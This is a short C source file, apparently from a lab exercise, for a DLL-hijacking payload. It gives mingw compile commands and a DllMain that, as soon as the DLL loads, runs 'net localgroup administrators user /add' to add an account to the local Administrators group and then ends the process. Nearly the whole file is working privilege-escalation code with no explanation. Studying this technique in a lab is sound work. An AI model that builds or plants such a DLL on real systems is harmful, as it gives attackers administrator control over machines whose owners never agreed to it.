// For x64 compile with: x86_64-w64-mingw32-gcc Exp_DLLHijack_Lab.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc Exp_DLLHijack_Lab.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}